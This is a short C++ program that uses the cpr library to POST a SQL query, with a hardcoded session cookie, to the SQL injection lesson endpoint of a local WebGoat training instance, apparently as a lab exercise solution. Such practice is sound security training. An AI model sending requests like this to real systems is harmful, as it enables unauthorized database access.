#include <iostream>
#include <cpr/cpr.h>

int main() {
    cpr::Header headers = { {"User-Agent", "curl/7.81.0"},
                           {"Cookie", "JSESSIONID=6DH3BtWZmtaA9BAw6uWtoE5VgdJBSMI37S_9z6JU"} };

    std::string query = "query=SELECT+department+FROM+employees+WHERE+last_name%3D'Franco'%3B";

    auto response = cpr::Post(cpr::Url{ "http://127.0.0.1:8080/WebGoat/SqlInjection/attack2" },
        cpr::Body{ query }, headers);

    std::cout << "Response code: " << response.status_code << std::endl;
    std::cout << "Response body: " << response.text << std::endl;

    return static_cast<int>(response.status_code);
}
